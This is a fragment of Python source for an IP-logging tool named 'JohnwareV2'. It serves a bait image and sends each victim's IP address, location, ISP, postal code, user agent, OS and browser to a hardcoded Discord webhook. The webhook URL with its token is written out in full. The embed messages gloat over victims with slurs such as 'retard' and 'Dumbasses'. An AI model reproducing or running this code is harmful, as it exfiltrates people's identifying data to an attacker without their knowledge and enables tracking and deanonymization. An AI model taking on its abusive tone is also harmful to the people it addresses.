...
webhook = 'https://discord.com/api/webhooks/1059147600995033368/gp9P3LSymvIsNu_jhPK1wUzsnmiAIJWCcb8OhwRlrtAeJsgRkwCoVl6KT-RStXoIhAa4'
bindata = requests.get('https://i.ibb.co/zPjFhsg/image-2023-01-12-230331108.png').content
...
def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
  ...
  "embeds": [
    {
      "title": "Botnet Bypassed, User hit!",
      "color": 16711803,
      "description": "Some retard fell for JohnwareV2! Here's his shit",
      "author": {
        "name": "JohnwareV2"
      },
      "fields": [
        {
          "name": "Dumbasses IP Info",
          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
          "inline": True
        },
        {
...
def prev(ip,uag):
  ...
  "embeds": [
    {
      "title": "J.R#0001 Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Johnware Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "JohnwareV2"
      },
      "fields": [
